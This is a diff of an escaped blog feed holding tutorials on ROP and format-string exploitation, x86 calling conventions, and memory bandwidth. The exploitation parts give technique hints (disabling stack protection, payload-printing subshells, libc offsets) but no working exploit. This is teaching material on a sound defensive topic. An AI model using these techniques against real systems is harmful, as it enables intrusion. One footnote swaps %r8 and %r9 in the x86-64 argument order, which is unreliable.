+&lt;p&gt;&lt;a href="https://en.wikipedia.org/wiki/Data_Execution_Prevention"&gt;DEP&lt;/a&gt; is the technique where memory can be either writable or executable, but not both. This prevents an attacker from filling a buffer with shellcode and executing it. While this usually requires hardware support, it is quite commonly used on modern programs. &amp;#160;&lt;a class="footnote-backref" href="#fnref:2" rev="footnote" title="Jump back to footnote 2 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id="fn:3"&gt;
+&lt;p&gt;To make life easier for us, we compile with &lt;code&gt;gcc -m32 -fno-stack-protector easy_rop.c&lt;/code&gt;. &amp;#160;&lt;a class="footnote-backref" href="#fnref:3" rev="footnote" title="Jump back to footnote 3 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id="fn:4"&gt;
+&lt;p&gt;You'll note that we use print the exploit string in a python subshell.  This is so we can print escape characters and use arbitrary bytes in our payload. We also surround the subshell in double quotes in case the payload had whitespace in it.&amp;#160;&lt;a class="footnote-backref" href="#fnref:4" rev="footnote" title="Jump back to footnote 4 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id="fn:7"&gt;
+&lt;p&gt;These can be found in the &lt;code&gt;libc&lt;/code&gt; library itself: &lt;code&gt;ldd a.out&lt;/code&gt; tells us that the library can be found at &lt;code&gt;/lib/i386-linux-gnu/libc.so.6&lt;/code&gt;. We can use &lt;code&gt;objdump&lt;/code&gt;, &lt;code&gt;nm&lt;/code&gt;, &lt;code&gt;strings&lt;/code&gt;, etc. on this library to directly find any information we need. These addresses will all be offset from the base of &lt;code&gt;libc&lt;/code&gt; in memory and can be used to compute the actual addresses by adding the offset of &lt;code&gt;libc&lt;/code&gt; in memory.&amp;#160;&lt;a class="footnote-backref" href="#fnref:7" rev="footnote" title="Jump back to footnote 5 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id="fn:8"&gt;
+&lt;p&gt;I believe someone even &lt;a href="http://cseweb.ucsd.edu/~hovav/papers/rbss12.html"&gt;tried to prove&lt;/a&gt; that ROP is turing complete.   &amp;#160;&lt;a class="footnote-backref" href="#fnref:8" rev="footnote" title="Jump back to footnote 6 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id="fn:10"&gt;
+&lt;p&gt;Note the &lt;code&gt;$'\211'&lt;/code&gt; syntax to enter escape characters.&amp;#160;&lt;a class="footnote-backref" href="#fnref:10" rev="footnote" title="Jump back to footnote 7 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id="fn:11"&gt;
+&lt;p&gt;To see why this is necessary, compare the behavior of &lt;code&gt;echo ls | bash&lt;/code&gt; to &lt;code&gt;cat &amp;lt;(echo ls) - | bash&lt;/code&gt;.&amp;#160;&lt;a class="footnote-backref" href="#fnref:11" rev="footnote" title="Jump back to footnote 8 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/div&gt;</summary><category term="exploitation"></category><category term="tutorial"></category></entry><entry><title>A brief introduction to x86 calling conventions</title><link href="http://codearcana.com/posts/2013/05/21/a-brief-introduction-to-x86-calling-conventions.html" rel="alternate"></link><updated>2013-05-21T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-05-21:posts/2013/05/21/a-brief-introduction-to-x86-calling-conventions.html</id><summary type="html">&lt;p&gt;To support some of my other tutorials, I will provide a brief introduction to x86 calling conventions. This should be considered an &lt;em&gt;introduction&lt;/em&gt;, not a thorough resource. I encourage you to check out the "Machine Prog" lectures from &lt;a href="https://www.cs.cmu.edu/afs/cs/academic/class/15213-s13/www/schedule.html"&gt;the CMU 15-213 course&lt;/a&gt; or an alternative resource. In particular, pages 11-14 of &lt;a href="https://www.cs.cmu.edu/afs/cs/academic/class/15213-s13/www/lectures/07-machine-procedures.pdf"&gt;this lecture&lt;/a&gt; are useful. &lt;a href="https://en.wikipedia.org/wiki/X86_calling_conventions"&gt;The wikipedia page&lt;/a&gt; is also a useful reference.&lt;/p&gt;
+&lt;h1&gt;Calling a function&lt;/h1&gt;
+&lt;p&gt;A computer program&lt;sup id="fnref:3"&gt;&lt;a class="footnote-ref" href="#fn:3" rel="footnote"&gt;1&lt;/a&gt;&lt;/sup&gt; keeps track of two important pointers as it runs: the instruction pointer, which points to the next instruction it will execute, and the stack pointer, which points to the last value pushed onto the stack. In x86, the instruction pointer is the register &lt;code&gt;%eip&lt;/code&gt; and the stack pointer is in the register &lt;code&gt;%esp&lt;/code&gt;&lt;sup id="fnref:4"&gt;&lt;a class="footnote-ref" href="#fn:4" rel="footnote"&gt;2&lt;/a&gt;&lt;/sup&gt;. The stack grows down (as values are pushed onto the stack, the stack pointer decreases) and is logically divided into regions, one for each function, called stack frames. &lt;/p&gt;
+&lt;p&gt;When a function is called, the instruction pointer is pushed onto the stack to allow the program to return to the site of the &lt;code&gt;call&lt;/code&gt; later. Before the &lt;code&gt;call&lt;/code&gt;, the instruction pointer points to the &lt;code&gt;call&lt;/code&gt; instruction and the stack pointer points to the last thing pushed (in this case, some garbage value):&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;                    code                          |          stack
+--------------------------------------------------+----------------------------
+%eip =&amp;gt; 0x00001f66: call   0x1ef0 &amp;lt;nop_ret&amp;gt;       |      | 0xdeadbeef | &amp;lt;= %esp
+        0x00001f6b: movl   $0x0,-0x8(%ebp)        |      |            |
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;After the &lt;code&gt;call&lt;/code&gt;, the instruction pointer points to the first instruction in our function and the stack pointer points to the last thing pushed, the return address from our function:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;                    code                          |          stack
+--------------------------------------------------+----------------------------
+%eip =&amp;gt; 0x00001ef0: ret                           |      | 0xdeadbeef |
+                                                  |      | 0x00001f6b | &amp;lt;= %esp
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;In this case, the function does nothing and merely returns. The &lt;code&gt;ret&lt;/code&gt; instruction pops a value off the stack and into &lt;code&gt;%eip&lt;/code&gt;. This both increments the stack pointer and returns control flow to the calling function:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;                    code                          |          stack
+--------------------------------------------------+----------------------------
+        0x00001f66: call   0x1ef0 &amp;lt;nop_ret&amp;gt;       |      | 0xdeadbeef | &amp;lt;= %esp
+%eip =&amp;gt; 0x00001f6b: movl   $0x0,-0x8(%ebp)        |      |            |
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1&gt;Arguments&lt;/h1&gt;
+&lt;p&gt;When a function needing arguments is called, they pushed onto the stack immediately before the call&lt;sup id="fnref:5"&gt;&lt;a class="footnote-ref" href="#fn:5" rel="footnote"&gt;3&lt;/a&gt;&lt;/sup&gt;. If there is more than one argument, the first argument is pushed on last. The following sequence of operations corresponds to the function call &lt;code&gt;proj_1(0x5, 0x10)&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;                    code                          |          stack
+--------------------------------------------------+----------------------------
+%eip =&amp;gt; 0x00001f78: pushl  $0x10                  |      | 0xdeadbeef | &amp;lt;= %esp
+        0x00001f7a: pushl  $0x5                   |      |            |
+        0x00001f7c: call   0x1f90 &amp;lt;proj_1&amp;gt;        |      |            |
+        0x00001f81: addl   $0x8, %esp             |      |            |      
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;div class="codehilite"&gt;&lt;pre&gt;        0x00001f78: pushl  $0x10                  |      | 0xdeadbeef |
+%eip =&amp;gt; 0x00001f7a: pushl  $0x5                   |      | 0x10       | &amp;lt;= %esp
+        0x00001f7c: call   0x1f90 &amp;lt;proj_1&amp;gt;        |      |            |
+        0x00001f81: addl   $0x8, %esp             |      |            |      
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;div class="codehilite"&gt;&lt;pre&gt;        0x00001f78: pushl  $0x10                  |      | 0xdeadbeef |
+        0x00001f7a: pushl  $0x5                   |      | 0x10       |
+%eip =&amp;gt; 0x00001f7c: call   0x1f90 &amp;lt;proj_1&amp;gt;        |      | 0x5        | &amp;lt;= %esp
+        0x00001f81: addl   $0x8, %esp             |      |            |      
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;It is more common to see arguments put onto the stack via &lt;code&gt;mov&lt;/code&gt; instructions rather than via &lt;code&gt;push&lt;/code&gt; instructions. The following block of code also would call &lt;code&gt;proj_1(0x5, 0x10)&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="nf"&gt;subl&lt;/span&gt; &lt;span class="no"&gt;$0x8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;%esp&lt;/span&gt;      &lt;span class="c"&gt;# Reserve space for the arguments (4 bytes for each arg).&lt;/span&gt;
+&lt;span class="nf"&gt;movl&lt;/span&gt; &lt;span class="no"&gt;$0x10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;%esp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="c"&gt;# Put the first argument at the memory address %esp + 4.&lt;/span&gt;
+&lt;span class="nf"&gt;movl&lt;/span&gt; &lt;span class="no"&gt;$0x5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;%esp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;    &lt;span class="c"&gt;# Put the second argument at the memory address %esp&lt;/span&gt;
+&lt;span class="nf"&gt;call&lt;/span&gt; &lt;span class="no"&gt;proj_1&lt;/span&gt;
+&lt;span class="nf"&gt;addl&lt;/span&gt; &lt;span class="no"&gt;$0x8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;%esp&lt;/span&gt;      &lt;span class="c"&gt;# Reclaim stack space reserved for arguments.&lt;/span&gt;
+&lt;span class="nf"&gt;ret&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1&gt;Return values&lt;/h1&gt;
+&lt;p&gt;As you can see, the arguments are above the return address on the stack immediately after the function call. In this case, our simple function returns merely the first argument. The &lt;code&gt;mov 0x4(%esp), %eax&lt;/code&gt; moves the value 4 above &lt;code&gt;%esp&lt;/code&gt; into &lt;code&gt;%eax&lt;/code&gt;. By convention, the return value of a function is in &lt;code&gt;%eax&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;                    code                          |          stack
+--------------------------------------------------+----------------------------
+%eip =&amp;gt; 0x00001f90: mov    0x4(%esp),%eax         |      | 0xdeadbeef | 
+        0x00001f94: ret                           |      | 0x10       |
+                                                  |      | 0x5        |
+                                                  |      | 0x00001f81 | &amp;lt;= %esp
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;div class="codehilite"&gt;&lt;pre&gt;        0x00001f90: mov    0x4(%esp),%eax         |      | 0xdeadbeef | 
+%eip =&amp;gt; 0x00001f94: ret                           |      | 0x10       |
+                                                  |      | 0x5        |
+                                                  |      | 0x00001f81 | &amp;lt;= %esp
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;div class="codehilite"&gt;&lt;pre&gt;        0x00001f78: pushl  $0x10                  |      | 0xdeadbeef |
+        0x00001f7a: pushl  $0x5                   |      | 0x10       |
+        0x00001f7c: call   0x1f90 &amp;lt;proj_1&amp;gt;        |      | 0x5        | &amp;lt;= %esp
+%eip =&amp;gt; 0x00001f81: addl   $0x8, %esp             |      |            |      
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Immediately after the function call, the &lt;code&gt;addl $0x8, %esp&lt;/code&gt; reclaims the stack space used by pushing the arguments (in this case, 4 bytes for each of the two arguments).&lt;/p&gt;
+&lt;h1&gt;Base pointer and local variables&lt;/h1&gt;
+&lt;p&gt;The base pointer is conventionally used to mark the start of a function's stack frame, or the area of the stack managed by that function. Local variables are stored below the base pointer and above the stack pointer. The start of each function has a preamble saves the old base pointer and initializes a new one and the end of each function has epilogue that restores the old base pointer:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="nl"&gt;my_function:&lt;/span&gt;
+  &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nv"&gt;%ebp&lt;/span&gt;              &lt;span class="c"&gt;# Preamble: save the old %ebp.&lt;/span&gt;
+  &lt;span class="nf"&gt;movl&lt;/span&gt; &lt;span class="nv"&gt;%esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;%ebp&lt;/span&gt;        &lt;span class="c"&gt;# Point %ebp to the saved %ebp and the new stack frame.&lt;/span&gt;
+
+  &lt;span class="nf"&gt;subl&lt;/span&gt; &lt;span class="no"&gt;$0x4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;%esp&lt;/span&gt;        &lt;span class="c"&gt;# Reserve space for local variables.&lt;/span&gt;
+
+  &lt;span class="nf"&gt;movl&lt;/span&gt; &lt;span class="mi"&gt;0x8&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;%ebp&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nv"&gt;%eax&lt;/span&gt;   
+  &lt;span class="no"&gt;movl&lt;/span&gt; &lt;span class="nv"&gt;%eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;0x4&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;%ebp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="c"&gt;# Move argument into local variable.&lt;/span&gt;
+
+  &lt;span class="c"&gt;# Function body. &lt;/span&gt;
+
+  &lt;span class="nf"&gt;addl&lt;/span&gt; &lt;span class="no"&gt;$0x4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;%esp&lt;/span&gt;        &lt;span class="c"&gt;# Reclaim space used by local variables.&lt;/span&gt;
+
+  &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nv"&gt;%ebp&lt;/span&gt;               &lt;span class="c"&gt;# Epilogue: restore the old %ebp.&lt;/span&gt;
+  &lt;span class="nf"&gt;ret&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Inside a function, the stack would look like this:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;| &amp;lt;argument 2&amp;gt;       |
+| &amp;lt;argument 1&amp;gt;       |
+| &amp;lt;return address&amp;gt;   |
+| &amp;lt;old ebp&amp;gt;          | &amp;lt;= %ebp
+| &amp;lt;local var 1&amp;gt;      |
+| &amp;lt;local var 2&amp;gt;      | &amp;lt;= %esp
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1&gt;Saving registers&lt;/h1&gt;
+&lt;p&gt;Inside a function, you can freely use &lt;code&gt;%eax&lt;/code&gt;, &lt;code&gt;%ecx&lt;/code&gt;, and &lt;code&gt;%edx&lt;/code&gt;. However, they are not guaranteed to be persistent across function calls (other functions can use them freely) so you must save them before calling other functions. If you use any other register, you &lt;em&gt;must&lt;/em&gt; make sure to save them before you use them and restore them to the original values before you return. Registers you must save before you call a function are called &lt;em&gt;caller save&lt;/em&gt; registers. Registers you must save before you can use them in a function are called &lt;em&gt;callee save&lt;/em&gt; registers. The following block of code demonstrates the proper way to save &lt;code&gt;%ebx&lt;/code&gt; (callee save) and &lt;code&gt;%ecx&lt;/code&gt; (caller save):&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="nl"&gt;my_function:&lt;/span&gt;
+  &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nv"&gt;%ebp&lt;/span&gt;              &lt;span class="c"&gt;# Preamble: save the old %ebp.&lt;/span&gt;
+  &lt;span class="nf"&gt;movl&lt;/span&gt; &lt;span class="nv"&gt;%esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;%ebp&lt;/span&gt;
+  &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nv"&gt;%ebx&lt;/span&gt;              &lt;span class="c"&gt;# Save %ebx before we use it.&lt;/span&gt;
+
+  &lt;span class="c"&gt;# Function body.&lt;/span&gt;
+
+  &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nv"&gt;%ecx&lt;/span&gt;              &lt;span class="c"&gt;# Save %ecx before a function call.  &lt;/span&gt;
+  &lt;span class="nf"&gt;call&lt;/span&gt; &lt;span class="no"&gt;another_function&lt;/span&gt;
+  &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nv"&gt;%ecx&lt;/span&gt;               &lt;span class="c"&gt;# Restore %ecx after a function call.&lt;/span&gt;
+
+  &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nv"&gt;%ebx&lt;/span&gt;               &lt;span class="c"&gt;# Restore %ebx before we return.&lt;/span&gt;
+  &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nv"&gt;%ebp&lt;/span&gt;               &lt;span class="c"&gt;# Epilogue: restore the old %ebp.&lt;/span&gt;
+  &lt;span class="nf"&gt;ret&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1&gt;To recap:&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;%esp&lt;/code&gt; points to the last thing pushed on the stack.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;%eip&lt;/code&gt; points to the next thing to execute.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;call &amp;lt;addr&amp;gt;&lt;/code&gt; pushes the current value of &lt;code&gt;%eip&lt;/code&gt; and changes &lt;code&gt;%eip&lt;/code&gt; to &lt;code&gt;&amp;lt;addr&amp;gt;&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ret&lt;/code&gt; pops the next value off the stack into &lt;code&gt;%eip&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Arguments are pushed onto the stack before a function call.&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Immediately after function call, the stack looks like this:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;| &amp;lt;argument 2&amp;gt;     |
+| &amp;lt;argument 1&amp;gt;     |
+| &amp;lt;return address&amp;gt; | &amp;lt;= %esp
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Inside a function, the stack looks like this:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;| &amp;lt;argument 2&amp;gt;       |
+| &amp;lt;argument 1&amp;gt;       |
+| &amp;lt;return address&amp;gt;   |
+| &amp;lt;old %ebp&amp;gt;         | &amp;lt;= %ebp
+| &amp;lt;local var 1&amp;gt;      |
+| &amp;lt;local var 2&amp;gt;      | &amp;lt;= %esp
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;The return value of a function is in &lt;code&gt;%eax&lt;/code&gt;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;%eax&lt;/code&gt;, &lt;code&gt;%ecx&lt;/code&gt;, and &lt;code&gt;%edx&lt;/code&gt; are caller save registers. &lt;code&gt;%ebp&lt;/code&gt;, &lt;code&gt;%ebx&lt;/code&gt;, &lt;code&gt;%edi&lt;/code&gt;, and &lt;code&gt;%esi&lt;/code&gt; are callee save registers.&lt;/li&gt;
+&lt;li&gt;Please read more to learn more!&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="footnote"&gt;
+&lt;hr /&gt;
+&lt;ol&gt;
+&lt;li id="fn:3"&gt;
+&lt;p&gt;While I hope to stay close the spirit of the truth, I'm about to lie to simplify things. Please forgive me.&amp;#160;&lt;a class="footnote-backref" href="#fnref:3" rev="footnote" title="Jump back to footnote 1 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id="fn:4"&gt;
+&lt;p&gt;In x86-64, the instruction pointer and the stack pointer are in the registers &lt;code&gt;%rip&lt;/code&gt; and &lt;code&gt;%rsp&lt;/code&gt;, respectively.&amp;#160;&lt;a class="footnote-backref" href="#fnref:4" rev="footnote" title="Jump back to footnote 2 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id="fn:5"&gt;
+&lt;p&gt;In x86-64, the first 6 integer arguments are passed in the registers &lt;code&gt;%rdi&lt;/code&gt;, &lt;code&gt;%rsi&lt;/code&gt;, &lt;code&gt;%rdx&lt;/code&gt;, &lt;code&gt;%rcx&lt;/code&gt;, &lt;code&gt;%r9&lt;/code&gt;, and &lt;code&gt;%r8&lt;/code&gt;. The first 8 floating point arguments are passed in via &lt;code&gt;%xmm0&lt;/code&gt; through &lt;code&gt;%xmm7&lt;/code&gt;. Any additional arguments are pushed onto the stack.&amp;#160;&lt;a class="footnote-backref" href="#fnref:5" rev="footnote" title="Jump back to footnote 3 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/div&gt;</summary><category term="tutorial"></category></entry><entry><title>Achieving maximum memory bandwidth</title><link href="http://codearcana.com/posts/2013/05/18/achieving-maximum-memory-bandwidth.html" rel="alternate"></link><updated>2013-05-18T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-05-18:posts/2013/05/18/achieving-maximum-memory-bandwidth.html</id><summary type="html">&lt;p&gt;These past few months I was a teaching assistant for a class on &lt;a href="http://15418.courses.cs.cmu.edu/15418_spr13/"&gt;parallel computer architecture&lt;/a&gt;. One of the questions on our first homework assignment asked the students to analyze a function and realize that it could not be optimized any further because it was already at maximum memory bandwidth. But a student pointed out, rightly, that it was only at &lt;em&gt;half&lt;/em&gt; the maximum bandwidth. In an attempt to understand what was going on, I embarked on a quest to write a program that achieved the theoretical maximum memory bandwidth.&lt;/p&gt;
 &lt;h2&gt;tl;dr&lt;/h2&gt;
 &lt;p&gt;&lt;em&gt;Use non-temporal vector instructions or optimized string instructions to get the full bandwidth.&lt;/em&gt;&lt;/p&gt;
 &lt;h1&gt;What is memory bandwidth?&lt;/h1&gt;
@@ -336,7 +986,8 @@ for functions that don't map to some symbol, but I understand that is hard. For 
 &lt;span class="go"&gt;       0   0.0% 100.0%       55   7.3% main&lt;/span&gt;
 &lt;span class="go"&gt;       0   0.0% 100.0%       55   7.3% solve&lt;/span&gt;
 &lt;span class="go"&gt;       0   0.0% 100.0%      694  92.7% start_thread  &lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;</summary><category term="profiling"></category></entry><entry><title>Introduction to Format String Exploits</title><link href="http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html" rel="alternate"></link><updated>2013-05-02T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-05-02:posts/2013/05/02/introduction-to-format-string-exploits.html</id><summary type="html">&lt;h1&gt;How do format strings vulnerabilities work?&lt;/h1&gt;
+&lt;/pre&gt;&lt;/div&gt;</summary><category term="profiling"></category></entry><entry><title>Introduction to format string exploits</title><link href="http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html" rel="alternate"></link><updated>2013-05-02T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-05-02:posts/2013/05/02/introduction-to-format-string-exploits.html</id><summary type="html">&lt;p&gt;It would be helpful to be familiar with the x86 calling conventions before reading this tutorial. I prepared a brief primer &lt;a href="http://codearcana.com/posts/2013/05/21/a-brief-introduction-to-x86-calling-conventions.html"&gt;here&lt;/a&gt; and you are encouraged to learn more on your own.&lt;/p&gt;
+&lt;h1&gt;How do format strings vulnerabilities work?&lt;/h1&gt;
 &lt;p&gt;Format string vulnerabilities are a pretty silly class of bug that take advantage of an easily avoidable programmer error.
 If the programmer passes an attacker-controlled buffer as the argument to a &lt;code&gt;printf&lt;/code&gt; 
 (or any of the related functions, including &lt;code&gt;sprintf&lt;/code&gt;, &lt;code&gt;fprintf&lt;/code&gt;, etc), the attacker can perform
